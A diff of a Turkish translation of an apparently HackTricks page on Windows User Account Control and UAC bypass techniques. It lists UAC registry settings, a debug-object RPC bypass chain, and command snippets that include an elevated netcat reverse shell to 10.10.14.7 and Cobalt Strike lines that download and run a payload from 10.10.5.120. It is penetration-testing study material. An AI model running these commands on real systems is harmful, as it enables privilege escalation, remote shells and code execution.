@@ -1,61 +1,62 @@
-# UAC - User Account Control
+# UAC - Kullanıcı Hesabı Denetimi
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## UAC
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için bir onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkinleştirildiğinde, bir yönetici uygulamaların/görevlerin çalışması için sisteme yönetici düzeyinde erişime sahip olmasını açıkça yetkilendirmediği sürece, uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir; ancak bir security boundary olarak kabul edilmez.<sup>[[2]](#references)</sup>
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` düzeyleri vardır ve **yüksek düzeydeki** bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, bir yönetici bu uygulamaların/görevlerin çalışabilmesi için sisteme yönetici düzeyinde erişim yetkisi vermediği sürece uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklere karşı koruyan bir kullanım kolaylığı özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.<sup>[[2]](#references)</sup>
 
-integrity levels hakkında daha fazla bilgi için:
+Integrity düzeyleri hakkında daha fazla bilgi:
 
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-UAC devrede olduğunda, yönetici kullanıcıya 2 token verilir: normal işlemleri medium integrity seviyesinde gerçekleştirmek için standart kullanıcı token'ı ve yönetici ayrıcalıklarına sahip bir token.
+UAC kullanıldığında, yönetici kullanıcısına 2 token verilir: normal işlemleri orta integrity düzeyinde gerçekleştirmek için standart kullanıcı token'ı ve yönetici ayrıcalıklarına sahip bir token.
 
-Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığını ayrıntılı olarak açıklar ve logon sürecini, kullanıcı deneyimini ve UAC mimarisini içerir.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin nasıl çalışacağını kuruluşlarına özel olarak yerel düzeyde (secpol.msc kullanarak) yapılandırmak veya bir Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtmak için security policies kullanabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak açıklanmıştır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntılar sağlar:
+Bu [sayfada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığı ayrıntılı olarak ele alınır; oturum açma süreci, kullanıcı deneyimi ve UAC mimarisi de açıklanır.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin nasıl çalışacağını kuruluşlarına göre yerel düzeyde (secpol.msc kullanarak) yapılandırmak için güvenlik ilkelerini kullanabilir veya Active Directory etki alanı ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak ele alınmıştır. UAC için ayarlanabilecek 10 Group Policy ayarı vardır. Aşağıdaki tabloda ek bilgiler verilmiştir:
 
-| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
+| Group Policy Ayarı                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Varsayılan Ayar                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [User Account Control: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
-| [User Account Control: Admin Approval Mode'daki yöneticiler için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
-| [User Account Control: Standart kullanıcılar için elevation prompt davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
-| [User Account Control: Uygulama kurulumlarını algıla ve elevation iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
-| [User Account Control: Yalnızca imzalanmış ve doğrulanmış executable'ları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
-| [User Account Control: Yalnızca güvenli konumlara yüklenmiş UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
-| [User Account Control: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
-| [User Account Control: UIAccess uygulamalarının secure desktop kullanmadan elevation istemesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
-| [User Account Control: Elevation istenirken secure desktop'a geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
-| [User Account Control: Dosya ve registry yazma hatalarını kullanıcıya özel konumlara virtualize et](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |
+| [Kullanıcı Hesabı Denetimi: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Devre dışı)                                             |
+| [Kullanıcı Hesabı Denetimi: Admin Approval Mode'daki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Güvenli masaüstünde Windows dışı ikili dosyalar için onay iste) |
+| [Kullanıcı Hesabı Denetimi: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Güvenli masaüstünde kimlik bilgilerini iste)         |
+| [Kullanıcı Hesabı Denetimi: Uygulama yüklemelerini algıla ve yükseltme iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Etkin; Enterprise'da varsayılan olarak devre dışı)           |
+| [Kullanıcı Hesabı Denetimi: Yalnızca imzalanmış ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Devre dışı)                                             |
+| [Kullanıcı Hesabı Denetimi: Yalnızca güvenli konumlara yüklenmiş UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Etkin)                                              |
+| [Kullanıcı Hesabı Denetimi: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Etkin)                                              |
+| [Kullanıcı Hesabı Denetimi: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemi göstermesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Devre dışı)                                             |
+| [Kullanıcı Hesabı Denetimi: Yükseltme istenirken güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Etkin)                                              |
+| [Kullanıcı Hesabı Denetimi: Dosya ve registry yazma hatalarını kullanıcı başına konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Etkin)                                              |
 
-### Windows'ta software yüklemeye yönelik Policies
+### Windows'ta yazılım yüklemeye yönelik ilkeler
 
-**local security policies** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların software yüklemesini önleyecek** şekilde yapılandırılmıştır. Bu, yönetici olmayan bir kullanıcı software'inizin installer'ını indirebilse bile, yönetici hesabı olmadan bunu çalıştıramayacağı anlamına gelir.
+**Yerel güvenlik ilkeleri** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların yazılım yüklemesini engelleyecek** şekilde yapılandırılır. Yani yönetici olmayan bir kullanıcı yazılımınızın yükleyicisini indirebilse bile, yönetici hesabı olmadan çalıştıramaz.
 
-### UAC'nin Elevation İstemesini Zorlayan Registry Keys
+### UAC'nin yükseltme istemesini sağlayan Registry Key'ler
 
-Yönetici haklarına sahip olmayan standart bir kullanıcı olarak, "standart" hesabın belirli eylemleri gerçekleştirmeye çalıştığında **UAC tarafından credentials istenmesini** sağlayabilirsiniz. Bu işlem, **registry keys** değiştirilmesini gerektirir; bir **UAC bypass** yoksa veya saldırgan zaten admin olarak logon olmuş değilse, bunun için admin permissions gerekir.
+Yönetici hakları olmayan standart bir kullanıcı olarak, "standart" hesabın belirli işlemleri gerçekleştirmeye çalıştığında UAC'nin **kimlik bilgilerini istemesini** sağlayabilirsiniz. Bu işlem, bir **UAC bypass** yoksa veya saldırgan zaten yönetici olarak oturum açmış değilse, yönetici izinleri gerektiren belirli **registry key'lerin** değiştirilmesini gerektirir.
 
-Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, yönetimsel eylemleri gerçekleştirmek için kullanıcının **hesap credentials'ını yeniden girmesini** zorunlu kılar.
+Kullanıcı **Administrators** grubunda olsa bile, bu değişiklikler yönetsel işlemleri gerçekleştirmek için kullanıcıyı **hesap kimlik bilgilerini yeniden girmeye** zorlar.
 
-**In practice this is only useful once you already have an elevated token, a UAC bypass, or a misconfiguration that lets you change these keys; otherwise the registry write itself is blocked.**
+**Uygulamada bu yalnızca zaten yükseltilmiş bir token'a, bir UAC bypass'a veya bu key'leri değiştirmenize izin veren bir yanlış yapılandırmaya sahipseniz işe yarar; aksi takdirde registry yazma işlemi engellenir.**
 
-Değiştirmeniz gereken registry keys ve entries aşağıdakilerdir (varsayılan değerleri parantez içinde):
+Değiştirmeniz gereken registry key'ler ve girdiler (varsayılan değerleri parantez içinde) şunlardır:
 
 - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
-- `ConsentPromptBehaviorUser` = 1 (3)
-- `ConsentPromptBehaviorAdmin` = 1 (5)
-- `PromptOnSecureDesktop` = 1 (1)
+  - `ConsentPromptBehaviorUser` = 1 (3)
+  - `ConsentPromptBehaviorAdmin` = 1 (5)
+  - `PromptOnSecureDesktop` = 1 (1)
 
-Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra yönetimsel işlemler, kullanıcının credentials'larını yeniden girmesini ister.
+Bu işlem Local Security Policy aracı üzerinden elle de yapılabilir. Değişiklik yapıldıktan sonra, yönetsel işlemler kullanıcıdan kimlik bilgilerini yeniden girmesini ister.
 
-### Note
+### Not
 
-**User Account Control bir security boundary değildir.** Bu nedenle standart kullanıcılar, local privilege escalation exploit'i olmadan hesaplarından çıkıp admin hakları elde edemez.
+**User Account Control bir güvenlik sınırı değildir.** Bu nedenle standart kullanıcılar, yerel bir privilege escalation exploit olmadan hesaplarından çıkıp yönetici hakları elde edemez.
 
-### Bir kullanıcıdan 'full computer access' isteme
+### Kullanıcıdan 'bilgisayara tam erişim' isteme
+
 ```powershell
 hostname | Set-Clipboard
 Enable-PSRemoting -SkipNetworkProfileCheck -Force
@@ -64,36 +65,38 @@ cd C:\Users\hacedorderanas\Desktop
 New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
 Enter-PSSession -ComputerName hostname
 ```
+
 ### UAC Ayrıcalıkları
 
-- Internet Explorer Protected Mode, yüksek bütünlük düzeyine sahip işlemlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu işlem, tarayıcının düşük bütünlük seviyesine sahip bir token ile çalıştırılmasıyla gerçekleştirilir. Tarayıcı, düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük seviyesini denetler ve erişime buna göre izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
-- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının bir listesini içeren bir access token oluşturur. Ayrıcalıklar, kullanıcının hakları ve yeteneklerinin birleşimi olarak tanımlanır. Token ayrıca kullanıcının kimlik bilgileri listesini de içerir; bunlar, kullanıcının bilgisayarda ve ağdaki kaynaklarda kimliğini doğrulamak için kullanılan kimlik bilgileridir.
+- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki süreçlerin (web tarayıcıları gibi) düşük bütünlük düzeyindeki verilere (geçici Internet dosyaları klasörü gibi) erişmesini önlemek için bütünlük denetimlerini kullanır. Bu, tarayıcı düşük bütünlük belirtecinde çalıştırılarak yapılır. Tarayıcı düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi sürecin bütünlük düzeyini denetler ve erişime buna göre izin verir. Bu özellik, uzaktan kod yürütme saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
+- Bir kullanıcı Windows'ta oturum açtığında sistem, kullanıcının ayrıcalıklarının listesini içeren bir erişim belirteci oluşturur. Ayrıcalıklar, kullanıcı hakları ve yeteneklerinin birleşimi olarak tanımlanır. Belirteç ayrıca kullanıcının kimlik bilgilerini de içerir; bunlar kullanıcıyı bilgisayarda ve ağ kaynaklarında kimlik doğrulamak için kullanılan bilgilerdir.
 
 ### Autoadminlogon
 
-Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı registry'de açığa çıkardığı için bunu yalnızca güvenli sistemlerde kullanın.
+Windows'u başlangıçta belirli bir kullanıcıyla otomatik olarak oturum açacak şekilde yapılandırmak için **`AutoAdminLogon` kayıt defteri anahtarını** ayarlayın. Bu, kiosk ortamları veya test amaçları için kullanışlıdır. Parolayı kayıt defterinde açıkça gösterdiğinden bunu yalnızca güvenli sistemlerde kullanın.
 
-Aşağıdaki key'leri Registry Editor veya `reg add` kullanarak ayarlayın:
+Registry Editor veya `reg add` kullanarak aşağıdaki anahtarları ayarlayın:
 
 - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
-- `AutoAdminLogon` = 1
-- `DefaultUsername` = username
-- `DefaultPassword` = password
+  - `AutoAdminLogon` = 1
+  - `DefaultUsername` = username
+  - `DefaultPassword` = password
 
-Normal oturum açma davranışına geri dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.
+Normal oturum açma davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.
 
 ## UAC bypass
 
 > [!TIP]
-> Victim'a graphical access erişiminiz varsa UAC bypass işleminin oldukça kolay olduğunu unutmayın; UAC prompt göründüğünde "Yes" seçeneğine tıklamanız yeterlidir.
+> Kurban makineye grafiksel erişiminiz varsa UAC bypass işleminin oldukça kolay olduğunu unutmayın; UAC istemi göründüğünde "Yes" düğmesine tıklamanız yeterlidir.
 
-UAC bypass aşağıdaki durumda gereklidir: **UAC etkin, process'iniz medium integrity context içinde çalışıyor ve user'ınız administrators grubuna dahil.**
+UAC bypass şu durumda gereklidir: **UAC etkin, süreciniz orta bütünlük bağlamında çalışıyor ve kullanıcınız administrators grubuna ait.**
 
-UAC en yüksek güvenlik seviyesindeyse (Always), diğer seviyelerden herhangi birinde (Default) olduğuna kıyasla bypass edilmesinin **çok daha zor** olduğunu belirtmek önemlidir.
+UAC en yüksek güvenlik düzeyindeyken (Always), diğer düzeylerden herhangi birindeyken (Default) olduğuna kıyasla **bypass etmenin çok daha zor olduğunu** belirtmek önemlidir.
 
-### Medium-integrity shell üzerinden hızlı triage
+### Orta bütünlüklü bir shell'den hızlı ön değerlendirme
 
-Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan yöntemlerle eşleştirin:
+Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve makinenin build sürümüne göre bilinen, çalışan yöntemleri belirleyin:
+
 ```powershell
 whoami /groups
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
@@ -102,44 +105,48 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v Prom
 powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
 schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
 ```
+
 Pratik notlar:
-- `EnableLUA=0` ise bypass işlemine gerek yoktur: herhangi bir admin token doğrudan high integrity isteğinde bulunabilir.
-- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
-- `Always Notify` çıtayı yükseltir, ancak başarısız olduğunu varsaymak yerine yine de tam build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ bazı `AlwaysNotify compatible` yöntemleri takip etmektedir.<sup>[[3]](#references)</sup>
+- `EnableLUA=0` ise bypass yapmanız gerekmez: herhangi bir admin token doğrudan yüksek bütünlük düzeyi isteyebilir.
+- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM tabanlı bypass'lar için yaygın senaryodur.
+- `Always Notify` çıtayı yükseltir, ancak başarısız olacağını varsaymak yerine tam build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ `AlwaysNotify compatible` bazı yöntemleri izlemektedir.<sup>[[3]](#references)</sup>
 
 ### UAC devre dışı
 
-UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`** değerindeyse), aşağıdakine benzer bir yöntem kullanarak **admin ayrıcalıklarıyla** (high integrity level) bir reverse shell **çalıştırabilirsiniz**:
+UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdaki gibi bir yöntemle admin ayrıcalıklarıyla (yüksek bütünlük düzeyinde) **reverse shell çalıştırabilirsiniz**:
+
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### Token duplication ile UAC bypass
+
+#### UAC bypass with token duplication
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### Yerel RPC + yeniden kullanılabilir debug nesnesi
+### Local RPC + yeniden kullanılabilir debug object
 
-AppInfo yerel RPC arayüzü `201ef99a-7fa0-444c-9399-19ba84f12a1a`, debugging etkinleştirilmiş bir process oluşturabilir. Aynı thread üzerinde debug ile oluşturulan process'ler thread'in debug nesnesini paylaşır; bir oluşturma debug olayı, RPC sonucunun kendisi yalnızca sınırlı erişim verse bile tam erişimli bir process handle taşır. Bu durum, Administrators grubunun medium-integrity üyesi için debug nesnesinin yeniden kullanılmasını bir UAC primitive'ine dönüştürür.<sup>[[11]](#references)[[12]](#references)</sup>
+AppInfo local RPC arayüzü `201ef99a-7fa0-444c-9399-19ba84f12a1a`, debugging etkin bir process oluşturabilir. Aynı thread üzerinde debug aracılığıyla oluşturulan process’ler thread’in debug object’ini paylaşır; oluşturma debug event’i, RPC sonucu yalnızca sınırlı erişim verse bile tam erişimli bir process handle taşır. Böylece debug object’in yeniden kullanılması, Administrators grubunun orta bütünlük düzeyindeki bir üyesi için UAC primitive’ine dönüşür.<sup>[[11]](#references)[[12]](#references)</sup>
 
-Pratik bir zincir şöyledir:<sup>[[11]](#references)[[12]](#references)</sup>
+Uygulanabilir bir zincir:<sup>[[11]](#references)[[12]](#references)</sup>
 
-1. Yerel RPC metodunu (`NdrAsyncClientCall` aracılığıyla veya doğrudan) kullanarak debugging etkinleştirilmiş, non-elevated bir kurban process oluşturun.
-2. `NtQueryInformationProcess` ile `ProcessDebugObjectHandle` sorgulayın, `NtRemoveProcessDebug` ile bağlantısını ayırın, nesneyi koruyun ve kurban process'i sonlandırın.
-3. Aynı RPC arayüzünü kullanarak güvenilir, otomatik olarak elevated olan bir process oluşturun; ardından `DbgUiSetThreadDebugObject` aracılığıyla kaydedilen nesneyi çağıran thread ile ilişkilendirin.
-4. `WaitForDebugEvent` çağrısını yapın ve `CREATE_PROCESS_DEBUG_EVENT` process handle'ını alın; devam etmeden önce `NtDuplicateObject` ile handle'ı çoğaltın.
-5. Çoğaltılan handle'ı `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` işlevine sağlayın ve extended startup-info yapısıyla payload'ı başlatın. Bu, hem elevated process context'ini yeniden kullanır hem de child process'e güvenilir görünen bir parent ilişkisi verir.
+1. Debugging etkin, yükseltilmemiş geçici bir process oluşturmak için local RPC metodunu (doğrudan veya `NdrAsyncClientCall` aracılığıyla) çağırın.
+2. `NtQueryInformationProcess` ile `ProcessDebugObjectHandle` sorgulayın, `NtRemoveProcessDebug` ile bağlantısını kesin, object’i saklayın ve geçici process’i sonlandırın.
+3. Güvenilir, auto-elevated bir process oluşturmak için aynı RPC arayüzünü kullanın; ardından `DbgUiSetThreadDebugObject` aracılığıyla saklanan object’i çağıran thread’e ilişkilendirin.
+4. `WaitForDebugEvent` çağırın ve `CREATE_PROCESS_DEBUG_EVENT` process handle’ını alın; devam etmeden önce `NtDuplicateObject` ile handle’ı çoğaltın.
+5. Çoğaltılan handle’ı `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` işlevine verin ve payload’ı genişletilmiş bir startup-info yapısıyla başlatın. Böylece hem yükseltilmiş process context’i yeniden kullanılır hem de child process’e güvenilir görünen bir parent ilişkisi sağlanır.
 
-Yalnızca auto-elevated binary'yi aramak yerine kısa diziye odaklanın: yerel AppInfo RPC process oluşturma, `ProcessDebugObjectHandle` sorguları, debugger detach/reattach işlemleri, hemen ardından gelen bir oluşturma-debug olayı, handle duplication ve kaydedilen parent'ı oluşturma API'lerini gerçekleştiren process ile eşleşmeyen bir child.<sup>[[12]](#references)</sup>
+Yalnızca auto-elevated binary’yi değil, kısa işlem dizisini de arayın: local AppInfo RPC ile process oluşturma, `ProcessDebugObjectHandle` sorguları, debugger detach/reattach, hemen ardından gelen bir creation-debug event’i, handle çoğaltma ve kayıtlı parent’ı creation API’lerini çalıştıran process ile eşleşmeyen bir child.<sup>[[12]](#references)</sup>
 
-### **Çok** Basit UAC "bypass"ı (tam dosya sistemi erişimi)
+### **Çok** Temel UAC "bypass" (dosya sistemine tam erişim)
 
-Administrators grubunda bulunan bir kullanıcıyla bir shell'iniz varsa, SMB (dosya sistemi) üzerinden paylaşılan **C$**'ı yeni bir diske yerel olarak mount edebilir ve **dosya sistemindeki her şeye erişim** elde edebilirsiniz (Administrator home folder'ı bile).
+Administrators grubunda yer alan bir kullanıcıyla shell’iniz varsa, SMB üzerinden paylaşılan **C$** öğesini yeni bir diske yerel olarak bağlayabilirsiniz; böylece **dosya sistemindeki her şeye** (hatta Administrator home folder’ına bile) erişebilirsiniz.
 
 > [!WARNING]
-> **Görünüşe göre bu trick artık çalışmıyor**
+> **Görünüşe göre bu numara artık çalışmıyor**
+
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -147,9 +154,11 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
+
 ### Cobalt Strike ile UAC bypass
 
-Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik seviyesine ayarlanmadıysa çalışır.
+Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik düzeyine ayarlanmamışsa işe yarar.
+
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -161,27 +170,29 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için çeşitli modüllere sahiptir.
+
+**Empire** ve **Metasploit**'te de **UAC**'yi **bypass** etmek için çeşitli modüller bulunur.
 
 ### Yükseltilmiş COM arayüzleri (`ICMLuaUtil` / `CMSTPLUA`)
